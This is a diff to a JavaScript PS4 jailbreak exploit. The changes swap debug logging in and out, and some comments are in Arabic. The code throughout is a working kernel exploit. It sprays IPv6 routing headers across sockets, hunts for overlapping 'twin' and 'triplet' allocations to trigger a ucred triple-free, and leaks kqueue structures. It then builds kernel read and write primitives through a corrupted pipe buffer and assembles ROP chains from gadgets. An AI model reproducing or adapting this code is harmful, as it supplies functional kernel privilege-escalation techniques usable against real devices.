@@ -139,7 +139,6 @@ var triplets = new Array(3);
 var ipv6_socks = new Array(IPV6_SOCK_NUM);
 var spray_rthdr = malloc(UCRED_SIZE);
 var spray_rthdr_len = -1;
-log("[INIT] spray_rthdr_len initialized = " + spray_rthdr_len);
 var leak_rthdr = malloc(UCRED_SIZE);
 
 // Allocate buffer for ipv6_sockets magic spray
@@ -238,36 +237,17 @@ function get_sockopt(sd, level, optname, optval, optlen) {
   return read32(sockopt_len_ptr);
 }
 function set_rthdr(sd, buf, len) {
-  // فحص قبل التنفيذ
-  log("[SET] sd=" + sd + " len=" + len);
-  log("[SET] first dword=" + hex(read32(buf)));
-
-  // التنفيذ الطبيعي
-  let ret = set_sockopt(sd, IPPROTO_IPV6, IPV6_RTHDR, buf, len);
-
-  // فحص بعد التنفيذ
-  log("[SET] ret=" + ret);
-
-  return ret;
+  return set_sockopt(sd, IPPROTO_IPV6, IPV6_RTHDR, buf, len);
+  // debug("set_sockopt with sd: " + hex(sd) + " ret: " + hex(ret));
+  // debug("Called with buf: " + hex(read64(buf)) + " len: " + hex(len));
+  // return ret;
 }
 function get_rthdr(sd, buf, max_len) {
-  // فحص قبل التنفيذ
-  log("[GET] sd=" + sd + " max_len=" + max_len);
-
-  // التنفيذ الطبيعي
-  let ret = get_sockopt(sd, IPPROTO_IPV6, IPV6_RTHDR, buf, max_len);
-
-  // فحص بعد التنفيذ
-  log("[GET] ret=" + ret);
-
-  for (let off = 0; off < max_len; off += 4) {
-    log("[GET] off=0x" + off.toString(16) +
-        " val=0x" + hex(read32(buf.add(off))));
-  }
-
-  return ret;
+  return get_sockopt(sd, IPPROTO_IPV6, IPV6_RTHDR, buf, max_len);
+  // debug("get_sockopt with sd: " + hex(sd) + " ret: " + hex(ret));
+  // debug("Result buf: " + hex(read64(buf)) + " max_len: " + hex(max_len));
+  // return ret;
 }
-
 function free_rthdrs(sds) {
   for (var sd of sds) {
     if (!sd.eq(new BigInt(0xFFFFFFFF, 0xFFFFFFFF))) {
@@ -527,39 +507,39 @@ function trigger_iov_recvmsg() {
 }
 function wait_iov_recvmsg() {
   var worker;
-  // Wait for completition
   for (var i = 0; i < IOV_THREAD_NUM; i++) {
     worker = iov_recvmsg_workers[i];
+    log("[WAIT] iov_recvmsg[" + i + "]: waiting at " + hex(worker.done));
     wait_for(worker.done, 1);
-    // debug("Worker done: " + hex(read64(worker.done)) );
+    log("[WAIT] iov_recvmsg[" + i + "]: done=" + read64(worker.done));
   }
-
-  // debug("iov_recvmsg workers run OK");
 }
 function trigger_ipv6_spray_and_read() {
-  // Worker information is already loaded
+  log("[TRIGGER] ipv6_spray_and_read: start");
 
-  // Clear done signals
   write64(spray_ipv6_worker.done, 0);
 
-  // Spawn ipv6_sockets spray and read worker
-  // Passing an stack addr reserved for each iteration
   var ret = spawn_thread(spray_ipv6_worker.rop, spray_ipv6_worker.loop_size, spray_ipv6_stack);
   if (ret.eq(BigInt_Error)) {
     throw new Error('Could not spray_ipv6_worker');
   }
-  var thread_id = Number(ret.and(0xFFFFFFFF)); // Convert to 32bits value
-  spray_ipv6_worker.thread_id = thread_id; // Save thread ID
 
-  // Send Init signal
+  var thread_id = Number(ret.and(0xFFFFFFFF));
+  spray_ipv6_worker.thread_id = thread_id;
+
+  log("[TRIGGER] ipv6_spray_and_read: spawned thread id=" + thread_id);
+
   ret = write(new BigInt(spray_ipv6_worker.pipe_1), spray_ipv6_worker.signal_buf, 1);
   if (ret.eq(BigInt_Error)) {
     throw new Error("Could not signal 'run' spray_ipv6_worker");
   }
+
+  log("[TRIGGER] ipv6_spray_and_read: signaled run");
 }
 function wait_ipv6_spray_and_read() {
-  // Wait for completition
+  log("[WAIT] ipv6_spray_and_read: waiting for done=1 at " + hex(spray_ipv6_worker.done));
   wait_for(spray_ipv6_worker.done, 1);
+  log("[WAIT] ipv6_spray_and_read: done value now = " + read64(spray_ipv6_worker.done));
 }
 function trigger_uio_readv() {
   var worker;
@@ -581,39 +561,37 @@ function trigger_uio_readv() {
 }
 function wait_uio_readv() {
   var worker;
-  // Wait for completition
   for (var i = 0; i < UIO_THREAD_NUM; i++) {
     worker = uio_readv_workers[i];
+    log("[WAIT] uio_readv[" + i + "]: waiting at " + hex(worker.done));
     wait_for(worker.done, 1);
+    log("[WAIT] uio_readv[" + i + "]: done=" + read64(worker.done));
   }
-  // debug("Exit wait_uio_readv()");
 }
 function trigger_uio_writev() {
-  var worker;
-  // Clear done signals
+  log("[TRIGGER] uio_writev: start");
+
   for (var i = 0; i < UIO_THREAD_NUM; i++) {
-    worker = uio_writev_workers[i];
+    var worker = uio_writev_workers[i];
     write64(worker.done, 0);
-    // debug("trigger_uio_writev done: " + hex(read64(worker.done)) );
   }
 
-  // Send Init signal
-  for (var _i7 = 0; _i7 < UIO_THREAD_NUM; _i7++) {
-    worker = uio_writev_workers[_i7];
+  for (var i = 0; i < UIO_THREAD_NUM; i++) {
+    var worker = uio_writev_workers[i];
     var ret = write(new BigInt(worker.pipe_1), worker.signal_buf, 1);
     if (ret.eq(BigInt_Error)) {
-      throw new Error("Could not signal 'run' iov_recvmsg_workers[" + _i7 + ']');
+      throw new Error("Could not signal 'run' uio_writev_workers[" + i + "]");
     }
+    log("[TRIGGER] uio_writev: signaled worker " + i);
   }
 }
 function wait_uio_writev() {
-  var worker;
-  // Wait for completition
   for (var i = 0; i < UIO_THREAD_NUM; i++) {
-    worker = uio_writev_workers[i];
+    var worker = uio_writev_workers[i];
+    log("[WAIT] uio_writev[" + i + "]: waiting at " + hex(worker.done));
     wait_for(worker.done, 1);
+    log("[WAIT] uio_writev[" + i + "]: done=" + read64(worker.done));
   }
-  // debug("Exit wait_uio_writev()");
 }
 function init() {
   log('***** Starting PS4 Jailbreak *****');
@@ -656,23 +634,14 @@ function setup() {
     set_rtprio(MAIN_RTPRIO);
     debug('  Previous core ' + prev_core + ' Pinned to core ' + MAIN_CORE);
     spray_rthdr_len = build_rthdr(spray_rthdr, UCRED_SIZE);
-    log("[WRITE] spray_rthdr_len updated to = " + spray_rthdr_len);
-    debug("[HDR] base spray_rthdr = " + hex(spray_rthdr));
-    debug("[HDR] first qword of spray_rthdr = " + hex(read64(spray_rthdr)));
     if (spray_rthdr_len <= 0) {
       cleanup(true);
       return false;
     }
     for (var i = 0; i < IPV6_SOCK_NUM; i++) {
       var base = spray_rthdr_rop.add(i * UCRED_SIZE);
-
       build_rthdr(base, UCRED_SIZE);
       write32(base.add(0x04), RTHDR_TAG | i);
-
-      debug("[HDR_ROP] sock=" + i +
-            " base=" + hex(base) +
-            " first_qword=" + hex(read64(base)) +
-            " tag32=" + hex(read32(base.add(0x04))));
     }
     write64(msg.add(0x10), msgIov);
     write64(msg.add(0x18), MSG_IOV_NUM);
@@ -798,123 +767,81 @@ function fill_buffer_64(buf, val, len) {
   }
 }
 function find_twins() {
-  log("=== ENTER find_twins ===");
-
   var count = 0;
   var val, i, j;
-
+  var zeroMemoryCount = 0;
   twins[0] = -1;
   twins[1] = -1;
-
   var spray_add = spray_rthdr.add(0x04);
-  var leak_add  = leak_rthdr.add(0x04);
-
+  var leak_add = leak_rthdr.add(0x04);
   while (count < MAX_ROUNDS_TWIN) {
-
-    log("[ROUND] " + count);
-
-    // -----------------------------
-    // 1) WRITE TAG | i لكل socket
-    // -----------------------------
+    if (typeof debugging !== 'undefined' && debugging.info && debugging.info.memory && debugging.info.memory.available === 0) {
+      zeroMemoryCount++;
+      if (zeroMemoryCount >= 5) {
+        cleanup();
+        return false;
+      }
+    } else {
+      zeroMemoryCount = 0;
+    }
     for (i = 0; i < ipv6_socks.length; i++) {
-      if (ipv6_socks[i].eq(BigInt_Error)) continue;
+      if (ipv6_socks[i].eq(BigInt_Error)) continue; // تعديل رقم 6
 
-      var written = (RTHDR_TAG | i);
-
-      log("[WRITE] sock=" + i +
-          " TAG|i=0x" + written.toString(16));
-
-      write32(spray_add, written);
-      read32(spray_add);
+      write32(spray_add, RTHDR_TAG | i);
+      read32(spray_add); // تعديل رقم 2 (memory barrier)
 
       set_rthdr(ipv6_socks[i], spray_rthdr, spray_rthdr_len);
     }
-
-    // -----------------------------
-    // 2) READ BACK من كل socket
-    // -----------------------------
     for (i = 0; i < ipv6_socks.length; i++) {
       if (ipv6_socks[i].eq(BigInt_Error)) continue;
-
-      write32(leak_add, 0);
+      write32(leak_add, 0); // تعديل رقم 4
       get_rthdr(ipv6_socks[i], leak_rthdr, 8);
-
       val = read32(leak_add);
       j = val & 0xFFFF;
-
-      log("[READ] sock=" + i +
-          " val=0x" + val.toString(16) +
-          " j=" + j);
-
-      // -----------------------------
-      // 3) CHECK TWIN CONDITION
-      // -----------------------------
-      if ((val & 0xFFFF0000) === RTHDR_TAG &&
-          i !== j &&
-          j >= 0 &&
-          j < ipv6_socks.length) {
-
+      if ((val & 0xFFFF0000) === RTHDR_TAG && i !== j && j >= 0 && j < ipv6_socks.length) {
         twins[0] = i;
         twins[1] = j;
-
-        log(">>> TWINS FOUND: [" + i + "] & [" + j + "]");
+        log(' TWINS : [' + i + '] [' + j + ']');
         return true;
       }
     }
-
     count++;
   }
-
-  log("NO TWINS FOUND AFTER " + MAX_ROUNDS_TWIN + " ROUNDS");
   twins[0] = -1;
   twins[1] = -1;
   return false;
 }
 function find_triplet(master, other, iterations) {
-  if (typeof iterations === 'undefined')
-      iterations = MAX_ROUNDS_TRIPLET;
-
+  if (typeof iterations === 'undefined') iterations = MAX_ROUNDS_TRIPLET;
   var count = 0;
   var val, i, j;
-
   var spray_add = spray_rthdr.add(0x04);
-  var leak_add  = leak_rthdr.add(0x04);
-
+  var leak_add = leak_rthdr.add(0x04);
   while (count < iterations) {
-
-    // كتابة TAG لكل socket ماعدا master و other
     for (i = 0; i < ipv6_socks.length; i++) {
       if (i === master || i === other) continue;
-      if (ipv6_socks[i].eq(BigInt_Error)) continue;
+      if (ipv6_socks[i].eq(BigInt_Error)) continue; // تعديل رقم 6
 
       write32(spray_add, RTHDR_TAG | i);
-      read32(spray_add);
+      read32(spray_add); // تعديل رقم 2
 
       set_rthdr(ipv6_socks[i], spray_rthdr, spray_rthdr_len);
     }
-
-    // قراءة master
-    write32(leak_add, 0);
+    write32(leak_add, 0); // تعديل رقم 4
     get_rthdr(ipv6_socks[master], leak_rthdr, 8);
-
     val = read32(leak_add);
     j = val & 0xFFFF;
 
-    // منع false positives
+    // تعديل رقم 3 (منع false positives)
     if (j === master || j === other) {
       count++;
       continue;
     }
-
-    if ((val & 0xFFFF0000) === RTHDR_TAG &&
-        j >= 0 &&
-        j < ipv6_socks.length) {
+    if ((val & 0xFFFF0000) === RTHDR_TAG && j >= 0 && j < ipv6_socks.length) {
       return j;
     }
-
     count++;
   }
-
   return -1;
 }
 function init_threading() {
@@ -1221,7 +1148,6 @@ function corrupt_pipe_buf(cnt, _in, out, size, buffer) {
   return read(new BigInt(masterRpipeFd), victim_pipe_buf, PIPEBUF_SIZE);
 }
 function kwrite(dest, src, n) {
-  log("KW WRITE dest = " + dest + " src = " + src + " size = " + n);
   if (dest.eq(0) || src.eq(0) || n <= 0) {
     return BigInt_Error;
   }
@@ -1230,10 +1156,8 @@ function kwrite(dest, src, n) {
     return BigInt_Error;
   }
   return write(new BigInt(victimWpipeFd), src, n);
-  log("KW WRITE done");
 }
 function kread(dest, src, n) {
-  log("KW READ dest = " + dest + " src = " + src + " size = " + n);
   if (dest.eq(0) || src.eq(0) || n <= 0) {
     return BigInt_Error;
   }
@@ -1243,28 +1167,22 @@ function kread(dest, src, n) {
   }
   read(new BigInt(victimRpipeFd), dest, n);
   return new BigInt(0);
-  log("KW READ done");
 }
 function kwrite64(addr, val) {
-  log("KW WRITE dest = " + dest + " src = " + src + " size = " + n);
   if (addr.eq(0)) {
     return BigInt_Error;
   }
   write64(tmp, val);
   return kwrite(addr, tmp, 8);
-  log("KW WRITE done");
 }
 function kwrite32(addr, val) {
-  log("KW WRITE dest = " + dest + " src = " + src + " size = " + n);
   if (addr.eq(0)) {
     return BigInt_Error;
   }
   write32(tmp, val);
   return kwrite(addr, tmp, 4);
-  log("KW WRITE done");
 }
 function kread64(addr) {
-  log("KW READ dest = " + dest + " src = " + src + " size = " + n);
   if (addr.eq(0)) {
     return new BigInt(0);
   }
@@ -1273,10 +1191,8 @@ function kread64(addr) {
     return new BigInt(0);
   }
   return read64(tmp);
-  log("KW READ done");
 }
 function kread32(addr) {
-  log("KW READ dest = " + dest + " src = " + src + " size = " + n);
   if (addr.eq(0)) {
     return 0;
   }
@@ -1285,10 +1201,8 @@ function kread32(addr) {
     return 0;
   }
   return read32(tmp);
-  log("KW READ done");
 }
 function read_buffer(addr, len) {
-  console.log("READ: addr =", addr, "size =", size, "first byte =", buffer[0]);
   if (addr.eq(0) || len <= 0) {
     return new Uint8Array(0);
   }
@@ -1297,17 +1211,14 @@ function read_buffer(addr, len) {
     buffer[i] = Number(read8(addr.add(i)));
   }
   return buffer;
-  console.log("READ buffer done");
 }
 function write_buffer(addr, buffer) {
-  console.log("READ: addr =", addr, "size =", size, "first byte =", buffer[0]);
   if (addr.eq(0) || !buffer || buffer.length === 0) {
     return;
   }
   for (var i = 0; i < buffer.length; i++) {
     write8(addr.add(i), buffer[i]);
   }
-  console.log("WRITE buffer done");
 }
 
 // Functions used in global kernel.js
@@ -1468,18 +1379,16 @@ function trigger_ucred_triplefree() {
 }
 function leak_kqueue() {
   debug('Leaking kqueue...');
-
-    // 1) free مرة واحدة قبل اللوب
+  // 1) اعمل free مرة واحدة فقط قبل اللوب
   free_rthdr(ipv6_socks[triplets[1]]);
 
-  // 2) صفّر الحقول اللي هتستخدمها
-  write64(leak_rthdr.add(0x08), 0);  // magic
-  write64(leak_rthdr.add(0x98), 0);  // fdp
+  // 2) صفّر الذاكرة مرة واحدة فقط
+  write64(leak_rthdr.add(0x08), 0);
+  write64(leak_rthdr.add(0x98), 0);
 
-  var MAX_KQ    = 4000;
+  var MAX_KQ = 4000;
   var magic_val = new BigInt(0x0, 0x1430000);
   var magic_add = leak_rthdr.add(0x08);
-
   for (var i = 0; i < MAX_KQ; i++) {
     // 3) افتح kqueue
     var kq = kqueue();
@@ -1504,17 +1413,15 @@ function leak_kqueue() {
       continue;
     }
 
-    // 7) نجاح
+    // 7) لو وصلنا هنا → نجاح
     kq_fdp = fdp;
     kl_lock = read64(leak_rthdr.add(0x60));
     close(kq);
     log('Leaking done .....');
     return true;
   }
-
   return false;
 }
-
 function leak_kqueue_safe() {
   try {
     return leak_kqueue();
@@ -2086,54 +1993,46 @@ function uio_writev_worker_rop(ready_signal, run_fd, done_signal, signal_buf) {
   };
 }
 function ipv6_sock_spray_and_read_rop(ready_signal, run_fd, done_signal, signal_buf) {
-
-  // دخول الدالة + حالة الهيدر
-  log(">>> ENTER ipv6_sock_spray_and_read_rop");
-  log("[STATE] spray_rthdr_len = " + spray_rthdr_len);
-  log("[STATE] spray_rthdr     = " + spray_rthdr);
-
   var rop = [];
   rop.push(new BigInt(0)); // first element overwritten by longjmp, skip it
 
-  // --- pin to core ---
   var cpu_mask = malloc(0x10);
   write16(cpu_mask, 1 << MAIN_CORE);
 
+  // Pin to core - cpuset_setaffinity(CPU_LEVEL_WHICH, CPU_WHICH_TID, -1, 0x10, mask)
   rop.push(gadgets.POP_RDI_RET);
   rop.push(new BigInt(3)); // CPU_LEVEL_WHICH
   rop.push(gadgets.POP_RSI_RET);
   rop.push(new BigInt(1)); // CPU_WHICH_TID
   rop.push(gadgets.POP_RDX_RET);
-  rop.push(BigInt_Error);  // id = -1 (current thread)
+  rop.push(BigInt_Error); // id = -1 (current thread)
   rop.push(gadgets.POP_RCX_RET);
   rop.push(new BigInt(0x10)); // setsize
   rop.push(gadgets.POP_R8_RET);
   rop.push(cpu_mask);
   rop.push(cpuset_setaffinity_wrapper);
-
-  // --- set rtprio ---
   var rtprio_buf = malloc(4);
   write16(rtprio_buf, PRI_REALTIME);
   write16(rtprio_buf.add(2), MAIN_RTPRIO);
 
+  // Set priority - rtprio_thread(RTP_SET, 0, rtprio_buf)
   rop.push(gadgets.POP_RDI_RET);
   rop.push(new BigInt(1)); // RTP_SET
   rop.push(gadgets.POP_RSI_RET);
-  rop.push(new BigInt(0)); // current thread
+  rop.push(new BigInt(0)); // lwpid = 0 (current thread)
   rop.push(gadgets.POP_RDX_RET);
   rop.push(rtprio_buf);
   rop.push(rtprio_thread_wrapper);
 
-  // --- signal ready ---
+  // Signal ready - write 1 to ready_signal
   rop.push(gadgets.POP_RDI_RET);
   rop.push(ready_signal);
   rop.push(gadgets.POP_RAX_RET);
   rop.push(new BigInt(1));
   rop.push(gadgets.MOV_QWORD_PTR_RDI_RAX_RET);
-
   var loop_init = rop.length;
 
-  // --- block on pipe (trigger) ---
+  // Read from pipe (blocks here) - read(run_fd, pipe_buf, 1)
   rop.push(gadgets.POP_RDI_RET);
   rop.push(run_fd);
   rop.push(gadgets.POP_RSI_RET);
@@ -2142,18 +2041,8 @@ function ipv6_sock_spray_and_read_rop(ready_signal, run_fd, done_signal, signal_
   rop.push(new BigInt(1));
   rop.push(read_wrapper);
 
-  // --- SPRAY PHASE ---
-  log("[ROP] entering spray loop, spray_rthdr_len = " + spray_rthdr_len);
-
+  // Spray all sockets
   for (var i = 0; i < ipv6_socks.length; i++) {
-    var buf = spray_rthdr_rop.add(i * UCRED_SIZE);
-
-    // لوج تشخيصي لكل socket
-    log("[SPRAY] sock=" + i +
-        " buf=" + hex(buf) +
-        " first_qword=" + hex(read64(buf)) +
-        " tag32=" + hex(read32(buf.add(0x04))));
-
     rop.push(gadgets.POP_RDI_RET);
     rop.push(ipv6_socks[i]);
     rop.push(gadgets.POP_RSI_RET);
@@ -2161,47 +2050,51 @@ function ipv6_sock_spray_and_read_rop(ready_signal, run_fd, done_signal, signal_
     rop.push(gadgets.POP_RDX_RET);
     rop.push(new BigInt(IPV6_RTHDR));
     rop.push(gadgets.POP_RCX_RET);
-    rop.push(buf); // spray_rthdr_rop.add(i * UCRED_SIZE)
+    rop.push(spray_rthdr_rop.add(i * UCRED_SIZE)); // Offset for socket i
+
+    // debug("");
+    // debug("Using this buffer " + hex(spray_rthdr_rop.add(i*UCRED_SIZE)) + " : " + hex(read64(spray_rthdr_rop.add(i*UCRED_SIZE))));
+
     rop.push(gadgets.POP_R8_RET);
     rop.push(new BigInt(spray_rthdr_len));
     rop.push(setsockopt_wrapper);
   }
 
-  // --- READBACK PHASE ---
-  for (var j = 0; j < ipv6_socks.length; j++) {
-    var read_buf = read_rthdr_rop.add(j * 8);
-
-    log("[READ_RTHDR_ROP] sock=" + j +
-        " read_buf=" + hex(read_buf));
-
+  // After spraying, read all sockets into buffer array
+  for (var _i15 = 0; _i15 < ipv6_socks.length; _i15++) {
     rop.push(gadgets.POP_RDI_RET);
-    rop.push(ipv6_socks[j]);
+    rop.push(ipv6_socks[_i15]);
+    // debug("");
+    // debug("pushed sock: " + hex(ipv6_socks[i]));
     rop.push(gadgets.POP_RSI_RET);
     rop.push(new BigInt(IPPROTO_IPV6));
     rop.push(gadgets.POP_RDX_RET);
     rop.push(new BigInt(IPV6_RTHDR));
     rop.push(gadgets.POP_RCX_RET);
-    rop.push(read_buf);
+    rop.push(read_rthdr_rop.add(_i15 * 8)); // Offset for socket i
+    // debug("Pushing read from add " + hex(read_rthdr_rop.add(i * 8)));
     rop.push(gadgets.POP_R8_RET);
     rop.push(check_len);
     rop.push(getsockopt_wrapper);
   }
 
-  // --- signal done ---
-  rop.push(gadgets.POP_RDI_RET);
+  // Signal done - write 1 to deletion_signal
+  rop.push(gadgets.POP_RDI_RET); // pop rdi ; ret
   rop.push(done_signal);
   rop.push(gadgets.POP_RAX_RET);
   rop.push(new BigInt(1));
   rop.push(gadgets.MOV_QWORD_PTR_RDI_RAX_RET);
 
-  // --- exit ---
+  // Exit
   rop.push(gadgets.POP_RDI_RET);
   rop.push(new BigInt(0));
   rop.push(thr_exit_wrapper);
 
+  // It's gonna loop
+
   return {
     rop,
-    loop_size: 0
+    loop_size: 0 // loop_size
   };
 }
 netctrl_exploit();
